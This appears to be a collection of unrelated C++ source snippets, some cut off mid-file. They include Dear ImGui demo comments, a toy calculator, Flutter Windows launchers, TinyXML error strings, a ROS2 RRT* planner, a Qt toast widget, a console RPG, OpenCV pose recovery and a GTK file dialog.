    "// dear imgui, v1.85 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Do NOT remove this file from your project! Think again! It is the most useful reference code that you and other\n// coders will want to refer to and call. Have the ImGui::ShowDemoWindow() function wired in an always-available\n// debug menu of your game/app! Removing this file from your project is hindering access to documentation for everyone\n// in your team, likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n// Message to beginner C/C++ programmers about the meaning of the 'static' keyword:\n// In this demo code, we frequently use 'static' variables inside functions. A static variable persists across calls,\n// so it is essentially like a global variable but declared inside the scope of the function. We do this as a way to\n// gather code and data in the same place, to make the demo source code faster to read, faster to write, and smaller\n// in size. It also happens to be a convenient way of storing simple UI related information as long as your function\n// doesn't need to be reentrant or used in multiple threads. This might be a pattern you will want to use in your code,\n// but most of the real data you would be editing is likely going to be stored outside your functions.\n\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui_internal.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.NavigateTo\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations, Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowMisc()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Example App: Constrained Resize / ShowExampleAppConstrainedResize()\n// [SECTION] Example App: Simple overlay / ShowExampleAppSimpleOverlay()\n// [SECTION] Example App: Fullscreen window / ShowExampleAppFullscreen()\n// [SECTION] Example App: Manipulating window titles / ShowExampleAppWindowTitles()\n// [SECTION] Example App: Custom Rendering using ImDrawList API / ShowExampleAppCustomRendering()\n// [SECTION] Example App: Documents Handling / ShowExampleAppDocuments()\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n\n// System includes\n#include <ctype.h>          // toupp",
    "#include <iostream>\n#include <string>\n\nusing namespace std;\n\nnamespace exce\n{\n\tclass Exception\n\t{\n\tprivate:\n\t\tstring message;\n\tpublic:\n\t\tException(string message)\n\t\t{\n\t\t\tthis->message = message;\n\t\t}\n\n\t\tconst string& what() const\n\t\t{\n\t\t\treturn message;\n\t\t}\n\t};\n}\n\n\nnamespace calc\n{\n\ttemplate <typename T_1, typename T_2>\n\tclass Calculator\n\t{\n\tprivate:\n\t\tT_1 number_1;\n\t\tT_2 number_2;\n\tpublic:\n\t\tCalculator(T_1 number_1 = 0, T_2 number_2 = 0)\n\t\t{\n\t\t\tthis->number_1 = number_1;\n\t\t\tthis->number_2 = number_2;\n\t\t}\n\t\tT_1 Addition()\n\t\t{\n\t\t\tif (number_1 == 0 || number_2 == 0)\n\t\t\t{\n\t\t\t\tthrow exce::Exception(\"And for what?\");\n\t\t\t}\n\n\t\t\treturn number_1 + number_2;\n\t\t}\n\n\t\tT_2 Multiplication()\n\t\t{\n\t\t\tif (number_1 == 1 || number_2 == 1)\n\t\t\t{\n\t\t\t\tthrow exce::Exception(\"And for what?\");\n\t\t\t}\n\t\t\treturn number_1 * number_2;\n\t\t}\n\t\tT_1 Subtraction()\n\t\t{\n\t\t\tif (number_1 == 0 || number_2 == 0)\n\t\t\t{\n\t\t\t\tthrow exce::Exception(\"And for what?\");\n\t\t\t}\n\n\t\t\treturn number_1 - number_2;\n\t\t}\n\t\tdouble Division()\n\t\t{\n\t\t\tif (number_2 == 0)\n\t\t\t{\n\t\t\t\tthrow exce::Exception(\"You can't do that!\");\n\t\t\t}\n\t\t\treturn number_1 / 1.0 / number_2;\n\t\t}\n\t};\n}\n\n\nint main()\n{\n\tcalc::Calculator<int, double> calculator_1(10, 0);\n\ttry\n\t{\n\t\tcout << calculator_1.Division() << endl;\n\t}\n\tcatch (const exce::Exception& exception)\n\t{\n\t\tcout << exception.what() << endl;\n\t}\n\n\treturn 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"calculator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\nwww.sourceforge.net/projects/tinyxml\nOriginal code (2.0 and earlier )copyright (c) 2000-2002 Lee Thomason (www.grinninglizard.com)\n\nThis software is provided 'as-is', without any express or implied \nwarranty. In no event will the authors be held liable for any \ndamages arising from the use of this software.\n\nPermission is granted to anyone to use this software for any \npurpose, including commercial applications, and to alter it and \nredistribute it freely, subject to the following restrictions:\n\n1. The origin of this software must not be misrepresented; you must\nnot claim that you wrote the original software. If you use this\nsoftware in a product, an acknowledgment in the product documentation\nwould be appreciated but is not required.\n\n2. Altered source versions must be plainly marked as such, and\nmust not be misrepresented as being the original software.\n\n3. This notice may not be removed or altered from any source\ndistribution.\n*/\n\n#include \"tinyxml.h\"\n\n// The goal of the seperate error file is to make the first\n// step towards localization. tinyxml (currently) only supports\n// english error messages, but the could now be translated.\n//\n// It also cleans up the code a bit.\n//\n\nconst char* TiXmlBase::errorString[ TIXML_ERROR_STRING_COUNT ] =\n{\n\t\"No error\",\n\t\"Error\",\n\t\"Failed to open file\",\n\t\"Memory allocation failed.\",\n\t\"Error parsing Element.\",\n\t\"Failed to read Element name\",\n\t\"Error reading Element value.\",\n\t\"Error reading Attributes.\",\n\t\"Error: empty tag.\",\n\t\"Error reading end tag.\",\n\t\"Error parsing Unknown.\",\n\t\"Error parsing Comment.\",\n\t\"Error parsing Declaration.\",\n\t\"Error document empty.\",\n\t\"Error null (0) or unexpected EOF found in input stream.\",\n\t\"Error parsing CDATA.\",\n};\n",
    "#include <cmath>\n#include <string>\n#include <memory>\n#include \"nav2_util/node_utils.hpp\"\n#include <random>\n#include <vector>\n#include <limits>\n\n#include \"nav2_rrtstar_planner/rrtstar_planner.hpp\"\n\nnamespace nav2_rrtstar_planner\n{\n\nvoid RRTStar::configure(\n  const rclcpp_lifecycle::LifecycleNode::WeakPtr & parent,\n  std::string name, std::shared_ptr<tf2_ros::Buffer> tf,\n  std::shared_ptr<nav2_costmap_2d::Costmap2DROS> costmap_ros)\n{\n  node_ = parent.lock();\n  name_ = name;\n  tf_ = tf;\n  costmap_ = costmap_ros->getCostmap();\n  global_frame_ = costmap_ros->getGlobalFrameID();\n  max_iterations_ = 1000;\n\n  // Parameter initialization\n  nav2_util::declare_parameter_if_not_declared(\n    node_, name_ + \".interpolation_resolution\", rclcpp::ParameterValue(0.01));\n  node_->get_parameter(name_ + \".interpolation_resolution\", interpolation_resolution_);\n}\n\nvoid RRTStar::cleanup()\n{\n  RCLCPP_INFO(\n    node_->get_logger(), \"CleaningUp plugin %s of type NavfnPlanner\",\n    name_.c_str());\n}\n\nvoid RRTStar::activate()\n{\n  RCLCPP_INFO(\n    node_->get_logger(), \"Activating plugin %s of type NavfnPlanner\",\n    name_.c_str());\n}\n\nvoid RRTStar::deactivate()\n{\n  RCLCPP_INFO(\n    node_->get_logger(), \"Deactivating plugin %s of type NavfnPlanner\",\n    name_.c_str());\n}\n\nvoid RRTStar::calculateBallRadiusConstant() {\n    double resolution = costmap_->getResolution();\n    double cellArea = resolution * resolution;\n    unsigned int numFreeCells = 0;\n\n    for (unsigned int x = 0; x < costmap_->getSizeInCellsX(); x++) {\n        for (unsigned int y = 0; y < costmap_->getSizeInCellsY(); y++) {\n            if (costmap_->getCost(x, y) == nav2_costmap_2d::FREE_SPACE) {\n                numFreeCells++;\n            }\n        }\n    }\n\n    double freeVolume = cellArea * numFreeCells; \n    int dimensions = 2;  \n    double vUnitBall = M_PI;  \n    ball_radius_constant_ = 2.0 * (1 + 1.0 / dimensions) * std::pow((freeVolume / vUnitBall), (1.0 / dimensions));\n    RCLCPP_INFO(node_->get_logger(), \"Ball Radius Constant: %f\", ball_radius_constant_);\n}\n\ndouble RRTStar::calculateBallRadius(int tree_size, int dimensions, double max_connection_distance) {\n    double term1 = (ball_radius_constant_ * std::log(tree_size)) / tree_size;\n    double term2 = std::pow(term1, 1.0 / dimensions);\n    return std::min(term2, max_connection_distance);\n}\n\nstd::vector<int> RRTStar::findVerticesInsideCircle(double center_x, double center_y, double radius) {\n    std::vector<int> vertices_inside_circle;\n\n    RCLCPP_INFO(node_->get_logger(), \"Radius of the circle: %.2f\", radius);\n\n    for (auto it = tree_.begin(); it != tree_.end(); ++it){\n        double distance_squared = std::pow(it->x - center_x, 2) + std::pow(it->y - center_y, 2);\n        if (distance_squared <= std::pow(radius, 2)) {\n            vertices_inside_circle.push_back(std::distance(tree_.begin(), it));\n        }\n    }\n\n    RCLCPP_INFO(node_->get_logger(), \"Number of vertices found within the circle: %lu\", vertices_inside_circle.size());\n\n    return vertices_inside_circle;\n}\n\ndouble RRTStar::calculate_distance(double x, double y, const Vertex& vertex) {\n    return std::sqrt(std::pow(vertex.x - x, 2) + std::pow(vertex.y - y, 2));\n}\n\nVertex* RRTStar::nearest_neighbor(double x, double y) {\n    Vertex* nearest_vertex = nullptr;\n    double min_distance = std::numeric_limits<double>::infinity();\n\n    for (auto& vertex : tree_) {\n        double dist = calculate_distance(x, y, vertex);\n        if (dist < min_distance) {\n            min_distance = dist;\n            nearest_vertex = &vertex;\n        }\n    }\n    return nearest_vertex;\n}\n\nbool RRTStar::connectible(const Vertex& start, const Vertex& end) {\n    double resolution = interpolation_resolution_;\n    double steps = std::ceil(std::hypot(end.x - start.x, end.y - start.y) / resolution);\n    if (steps > 0){\n      double x_increment = (end.x - start.x) / steps;\n      double y_increment = (end.y - start.y) / steps;\n\n      double x = start.x, y = start.y;\n      for (int i = 0; i < steps; ++i) {\n          unsigned int mx, my;\n          if (!costmap_->worldToMap(x, y, mx, my)) return false;\n          if (costmap_->getCost(mx, my) != nav2_costmap_2d::FREE_SPACE) return false;\n          x += x_increment;\n          y += y_increment;\n      }\n    }\n    return true;\n}\n\ndouble RRTStar::calculate_cost_from_start(const Vertex& vertex) {\n    double total_cost = 0.0;\n\n    const Vertex* cur_ver = &vertex;\n\n    while (cur_ver != nullptr) {\n        total_cost += cur_ver->cost;\n        cur_ver = cur_ver->parent;\n    }\n\n    return total_cost;\n}\n\nnav_msgs::msg::Path RRTStar::createPlan(\n  const geometry_msgs::msg::PoseStamped & start,\n  const geometry_msgs::msg::PoseStamped & goal)\n{\n  nav_msgs::msg::Path global_path;\n\n  // Checking if the goal and start state is in the global frame\n  if (start.header.frame_id != global_frame_) {\n    RCLCPP_ERROR(\n      node_->get_logger(), \"Planner will only accept start position from %s frame\",\n      global_frame_.c_str());\n    return global_path;\n  }\n\n  if (goal",
    "#include \"Toast.h\"\n\n\n// Static\nint Toast::s_maximumOnScreen = 3;\nint Toast::s_spacing = 10;\nint Toast::s_offsetX = 20;\nint Toast::s_offsetY = 45;\nbool Toast::s_alwaysOnMainScreen = false;\nQScreen* Toast::s_fixedScreen = nullptr;\nToastPosition Toast::s_position = ToastPosition::BOTTOM_RIGHT;\nstd::deque<Toast*> Toast::s_currentlyShown = std::deque<Toast*>();\nstd::deque<Toast*> Toast::s_queue = std::deque<Toast*>();\n\n// Static constants\nconst int Toast::sc_updatePositionDuration = 200;\nconst int Toast::sc_durationBarUpdateInterval = 5;\nconst int Toast::sc_dropShadowSize = 5;\nconst QColor Toast::sc_successAccentColor = QColor(\"#3E9141\");\nconst QColor Toast::sc_warningAccentColor = QColor(\"#E8B849\");\nconst QColor Toast::sc_errorAccentColor = QColor(\"#BA2626\");\nconst QColor Toast::sc_informationAccentColor = QColor(\"#007FFF\");\nconst QColor Toast::sc_defaultAccentColor = QColor(\"#5C5C5C\");\nconst QColor Toast::sc_defaultBackgroundColor = QColor(\"#E7F4F9\");\nconst QColor Toast::sc_defaultTitleColor = QColor(\"#000000\");\nconst QColor Toast::sc_defaultTextColor = QColor(\"#5C5C5C\");\nconst QColor Toast::sc_defaultIconSeparatorColor = QColor(\"#D9D9D9\");\nconst QColor Toast::sc_defaultCloseButtonIconColor = QColor(\"#000000\");\nconst QColor Toast::sc_defaultBackgroundColorDark = QColor(\"#292929\");\nconst QColor Toast::sc_defaultTitleColorDark = QColor(\"#FFFFFF\");\nconst QColor Toast::sc_defaultTextColorDark = QColor(\"#D0D0D0\");\nconst QColor Toast::sc_defaultIconSeparatorColorDark = QColor(\"#585858\");\nconst QColor Toast::sc_defaultCloseButtonIconColorDark = QColor(\"#C9C9C9\");\n\n\nToast::Toast(QWidget* parent)\n    : QDialog(parent)\n{\n    // Init attributes\n    m_duration = 5000;\n    m_showDurationBar = true;\n    m_title = \"\";\n    m_text = \"\";\n    m_icon = getIconFromEnum(ToastIcon::INFORMATION);\n    m_showIcon = false;\n    m_iconSize = QSize(18, 18);\n    m_showIconSeparator = true;\n    m_iconSeparatorWidth = 2;\n    m_closeButtonIcon = getIconFromEnum(ToastIcon::CLOSE);\n    m_showCloseButton = true;\n    m_closeButtonIconSize = QSize(10, 10);\n    m_closeButtonSize = QSize(24, 24);\n    m_closeButtonAlignment = ToastButtonAlignment::TOP;\n    m_fadeInDuration = 250;\n    m_fadeOutDuration = 250;\n    m_resetDurationOnHover = true;\n    m_stayOnTop = true;\n    m_borderRadius = 0;\n    m_backgroundColor = sc_defaultBackgroundColor;\n    m_titleColor = sc_defaultTitleColor;\n    m_textColor = sc_defaultTextColor;\n    m_iconColor = sc_defaultAccentColor;\n    m_iconSeparatorColor = sc_defaultIconSeparatorColor;\n    m_closeButtonIconColor = sc_defaultCloseButtonIconColor;\n    m_durationBarColor = sc_defaultAccentColor;\n    m_titleFont = QFont(\"Arial\", 9, QFont::Weight::Bold);\n    m_textFont = QFont(\"Arial\", 9);\n    m_margins = QMargins(20, 18, 10, 18);\n    m_iconMargins = QMargins(0, 0, 15, 0);\n    m_iconSectionMargins = QMargins(0, 0, 15, 0);\n    m_textSectionMargins = QMargins(0, 0, 15, 0);\n    m_closeButtonMargins = QMargins(0, -8, 0, -8);\n    m_textSectionSpacing = 8;\n\n    m_elapsedTime = 0;\n    m_fadingOut = false;\n    m_used = false;\n    m_parent = parent;\n\n    // Window settings\n    setAttribute(Qt::WidgetAttribute::WA_TranslucentBackground);\n    setFocusPolicy(Qt::FocusPolicy::NoFocus);\n\n    // Notification widget (QLabel because QWidget has weird behaviour with stylesheets)\n    m_notification = new QLabel(this);\n\n    // Drop shadow (has to be drawn manually since only one graphics effect can be applied)\n    m_dropShadowLayer1 = new QWidget(this);\n    m_dropShadowLayer2 = new QWidget(this);\n    m_dropShadowLayer3 = new QWidget(this);\n    m_dropShadowLayer4 = new QWidget(this);\n    m_dropShadowLayer5 = new QWidget(this);\n    m_dropShadowLayer1->setObjectName(\"toast-drop-shadow-layer-1\");\n    m_dropShadowLayer2->setObjectName(\"toast-drop-shadow-layer-2\");\n    m_dropShadowLayer3->setObjectName(\"toast-drop-shadow-layer-3\");\n    m_dropShadowLayer4->setObjectName(\"toast-drop-shadow-layer-4\");\n    m_dropShadowLayer5->setObjectName(\"toast-drop-shadow-layer-5\");\n\n    // Opacity effect for fading animations\n    m_opacityEffect = new QGraphicsOpacityEffect();\n    m_opacityEffect->setOpacity(1);\n    setGraphicsEffect(m_opacityEffect);\n\n    // Close button\n    m_closeButton = new QPushButton(m_notification);\n    m_closeButton->setCursor(Qt::CursorShape::PointingHandCursor);\n    m_closeButton->setObjectName(\"toast-close-button\");\n    connect(m_closeButton, SIGNAL(clicked()), this, SLOT(hide()));\n\n    // Text and title labels\n    m_titleLabel = new QLabel(m_notification);\n    m_textLabel = new QLabel(m_notification);\n\n    // Icon (QPushButton instead of QLabel to get better icon quality)\n    m_iconWidget = new QPushButton(m_notification);\n    m_iconWidget->setObjectName(\"toast-icon-widget\");\n\n    // Icon separator\n    m_iconSeparator = new QWidget(m_notification);\n    m_iconSeparator->setFixedWidth(2);\n\n    // Duration bar container (used to make border radius possible on 4 px high widget)\n    m_durationBarContainer = new QWidget(m_notification);\n    m_dur",
    "#include <iostream> \n#include <sstream>\n#include \"hero.h\"\n#include \"menu.h\"\n#include \"database.h\"\n#include \"Tool.h\"\n#include \"game.h\"\n#include \"enemy.h\"\n#include \"fight.h\"\n#include \"game.h\"\n#include \"Cave.h\"\n#include \"shop.h\"\n#include \"Intro.h\"\n\n\nvoid game::start_game(Hero &god, std::vector<Enemy> &enemies) {\n    std::vector<std::shared_ptr<Spell>> availableSpells = DB1.createSpells();\n    Shop spellShop(availableSpells);\n\n    char choice;\n    bool gameRunning = true;\n    Too.slow_print(\"The game has now begun and you are playing as \");\n    std::cout << god.getName() << std::endl << std::endl;\n\n    while (gameRunning) {\n        std::cout << \"____________________\" << std::endl;\n        std::cout << \"1. Checkout stats \" << std::endl;\n        std::cout << \"____________________\" << std::endl;\n        std::cout << \"2. Fight an enemy \" << std::endl;\n        std::cout << \"____________________\" << std::endl;\n        std::cout << \"3. Enter a cave\" << std::endl;\n        std::cout << \"____________________\" << std::endl;\n        std::cout << \"4. Buy spells\" << std::endl;\n        std::cout << \"____________________\" << std::endl;\n        std::cout << \"5. Take a nap\" << std::endl;\n        std::cout << \"____________________\" << std::endl;\n        std::cout << \"6. Element table\" << std::endl;\n        std::cout << \"____________________\" << std::endl;\n        std::cout << \"7. Save your character  \" << std::endl;\n        std::cout << \"____________________\" << std::endl;\n        std::cout << \"8. Exit game \" << std::endl;\n        std::cout << \"____________________\" << std::endl << std::endl;\n        std::cout << \"Enter your choice: \";\n\n        choice = Too.getKeypress();\n        std::cout << std::endl;\n\n        switch (choice) {\n            case '1':\n                god.showStats();\n                break;\n            case '2':\n                printEnemies();\n                F1.battleEnemy(enemies);\n                break;\n            case '3':\n                printCaves();\n                cave_select();\n                break;\n            case '4':\n                Too.slow_print(\"Welcome to the Spell Shop!\");\n                Too.delay();\n                spellShop.displayAndBuySpells(god);\n                break;\n            case '5':\n                Too.slow_print(\"You took a nap and feel energized\");\n                god.resetHealth();\n                god.resetMana();\n                Too.delay();\n                break;\n            case '6':\n                T1.weakness();\n                break;\n            case '7':\n                DB1.saveCharacter(god);\n                break;\n            case '8':\n                system(\"clear\");\n                gameRunning = false;\n                break;\n            default:\n                system(\"clear\");\n                std::cout << \"Invalid input try again\" << std::endl;\n                break;\n        }\n    }\n}\n\n\nvoid game::victory(){\n\n    std::ostringstream message;\n    message << \"You have defeated the dragon congrats \" << std::endl; \n    Too.slow_print(message.str());\n    Too.delay();\n    DB1.saveCharacter(god);\n    exit(0);\n}\n\ngame G1;",
    "#include \"solve_5pts.h\"\n\n\nnamespace cv {\n    void decomposeEssentialMat( InputArray _E, OutputArray _R1, OutputArray _R2, OutputArray _t )\n    {\n\n        Mat E = _E.getMat().reshape(1, 3);\n        CV_Assert(E.cols == 3 && E.rows == 3);\n\n        Mat D, U, Vt;\n        SVD::compute(E, D, U, Vt);\n\n        if (determinant(U) < 0) U *= -1.;\n        if (determinant(Vt) < 0) Vt *= -1.;\n\n        Mat W = (Mat_<double>(3, 3) << 0, 1, 0, -1, 0, 0, 0, 0, 1);\n        W.convertTo(W, E.type());\n\n        Mat R1, R2, t;\n        R1 = U * W * Vt;\n        R2 = U * W.t() * Vt;\n        t = U.col(2) * 1.0;\n\n        R1.copyTo(_R1);\n        R2.copyTo(_R2);\n        t.copyTo(_t);\n    }\n\n    int recoverPose( InputArray E, InputArray _points1, InputArray _points2, InputArray _cameraMatrix,\n                         OutputArray _R, OutputArray _t, InputOutputArray _mask)\n    {\n\n        Mat points1, points2, cameraMatrix;\n        _points1.getMat().convertTo(points1, CV_64F);\n        _points2.getMat().convertTo(points2, CV_64F);\n        _cameraMatrix.getMat().convertTo(cameraMatrix, CV_64F);\n\n        int npoints = points1.checkVector(2);\n        CV_Assert( npoints >= 0 && points2.checkVector(2) == npoints &&\n                                  points1.type() == points2.type());\n\n        CV_Assert(cameraMatrix.rows == 3 && cameraMatrix.cols == 3 && cameraMatrix.channels() == 1);\n\n        if (points1.channels() > 1)\n        {\n            points1 = points1.reshape(1, npoints);\n            points2 = points2.reshape(1, npoints);\n        }\n\n        double fx = cameraMatrix.at<double>(0,0);\n        double fy = cameraMatrix.at<double>(1,1);\n        double cx = cameraMatrix.at<double>(0,2);\n        double cy = cameraMatrix.at<double>(1,2);\n\n        points1.col(0) = (points1.col(0) - cx) / fx;\n        points2.col(0) = (points2.col(0) - cx) / fx;\n        points1.col(1) = (points1.col(1) - cy) / fy;\n        points2.col(1) = (points2.col(1) - cy) / fy;\n\n        points1 = points1.t();\n        points2 = points2.t();\n\n        Mat R1, R2, t;\n        decomposeEssentialMat(E, R1, R2, t);\n        Mat P0 = Mat::eye(3, 4, R1.type());\n        Mat P1(3, 4, R1.type()), P2(3, 4, R1.type()), P3(3, 4, R1.type()), P4(3, 4, R1.type());\n        P1(Range::all(), Range(0, 3)) = R1 * 1.0; P1.col(3) = t * 1.0;\n        P2(Range::all(), Range(0, 3)) = R2 * 1.0; P2.col(3) = t * 1.0;\n        P3(Range::all(), Range(0, 3)) = R1 * 1.0; P3.col(3) = -t * 1.0;\n        P4(Range::all(), Range(0, 3)) = R2 * 1.0; P4.col(3) = -t * 1.0;\n\n        // Do the cheirality check.\n        // Notice here a threshold dist is used to filter\n        // out far away points (i.e. infinite points) since\n        // there depth may vary between postive and negtive.\n        double dist = 50.0;\n        Mat Q;\n        triangulatePoints(P0, P1, points1, points2, Q);\n        Mat mask1 = Q.row(2).mul(Q.row(3)) > 0;\n        Q.row(0) /= Q.row(3);\n        Q.row(1) /= Q.row(3);\n        Q.row(2) /= Q.row(3);\n        Q.row(3) /= Q.row(3);\n        mask1 = (Q.row(2) < dist) & mask1;\n        Q = P1 * Q;\n        mask1 = (Q.row(2) > 0) & mask1;\n        mask1 = (Q.row(2) < dist) & mask1;\n\n        triangulatePoints(P0, P2, points1, points2, Q);\n        Mat mask2 = Q.row(2).mul(Q.row(3)) > 0;\n        Q.row(0) /= Q.row(3);\n        Q.row(1) /= Q.row(3);\n        Q.row(2) /= Q.row(3);\n        Q.row(3) /= Q.row(3);\n        mask2 = (Q.row(2) < dist) & mask2;\n        Q = P2 * Q;\n        mask2 = (Q.row(2) > 0) & mask2;\n        mask2 = (Q.row(2) < dist) & mask2;\n\n        triangulatePoints(P0, P3, points1, points2, Q);\n        Mat mask3 = Q.row(2).mul(Q.row(3)) > 0;\n        Q.row(0) /= Q.row(3);\n        Q.row(1) /= Q.row(3);\n        Q.row(2) /= Q.row(3);\n        Q.row(3) /= Q.row(3);\n        mask3 = (Q.row(2) < dist) & mask3;\n        Q = P3 * Q;\n        mask3 = (Q.row(2) > 0) & mask3;\n        mask3 = (Q.row(2) < dist) & mask3;\n\n        triangulatePoints(P0, P4, points1, points2, Q);\n        Mat mask4 = Q.row(2).mul(Q.row(3)) > 0;\n        Q.row(0) /= Q.row(3);\n        Q.row(1) /= Q.row(3);\n        Q.row(2) /= Q.row(3);\n        Q.row(3) /= Q.row(3);\n        mask4 = (Q.row(2) < dist) & mask4;\n        Q = P4 * Q;\n        mask4 = (Q.row(2) > 0) & mask4;\n        mask4 = (Q.row(2) < dist) & mask4;\n\n        mask1 = mask1.t();\n        mask2 = mask2.t();\n        mask3 = mask3.t();\n        mask4 = mask4.t();\n\n        // If _mask is given, then use it to filter outliers.\n        if (!_mask.empty())\n        {\n            Mat mask = _mask.getMat();\n            CV_Assert(mask.size() == mask1.size());\n            bitwise_and(mask, mask1, mask1);\n            bitwise_and(mask, mask2, mask2);\n            bitwise_and(mask, mask3, mask3);\n            bitwise_and(mask, mask4, mask4);\n        }\n        if (_mask.empty() && _mask.needed())\n        {\n            _mask.create(mask1.size(), CV_8U);\n        }\n\n        CV_Assert(_R.needed() && _t.needed());\n        _R.create(3, 3, R1.type());\n        _t.create(3, 1, t.type());\n\n        int good1 = countNonZero(mask1)",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"list_pagination\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"ChooserDialog.h\"\n\nvoid ChooserDialog::init(GtkFileChooserAction action, string title, string cancel_name, string accept_name) {\n    window = gtk_window_new(GTK_WINDOW_TOPLEVEL);\n    gtk_window_set_title(GTK_WINDOW(window), title.c_str());\n\n    dialog = gtk_file_chooser_dialog_new(title.c_str(),\n                                         GTK_WINDOW(window),\n                                         action,\n                                         cancel_name.c_str(),\n                                         GTK_RESPONSE_CANCEL,\n                                         accept_name.c_str(),\n                                         GTK_RESPONSE_ACCEPT,\n                                         NULL);\n}\nstring ChooserDialog::run() {\n    string path;\n    res = gtk_dialog_run(GTK_DIALOG(dialog));\n    if (res == GTK_RESPONSE_ACCEPT) {\n        GtkFileChooser *chooser = GTK_FILE_CHOOSER(dialog);\n        path = gtk_file_chooser_get_filename(chooser);\n    } else if (res == GTK_RESPONSE_CANCEL) {\n        gtk_widget_destroy(dialog);\n        throw runtime_error(\"The user has closed the path selection window\");\n    } else {\n        gtk_widget_destroy(dialog);\n        throw runtime_error(\"[!] Unexpected error\");\n    }\n\n    gtk_widget_destroy(dialog);\n\n    return path;\n}",
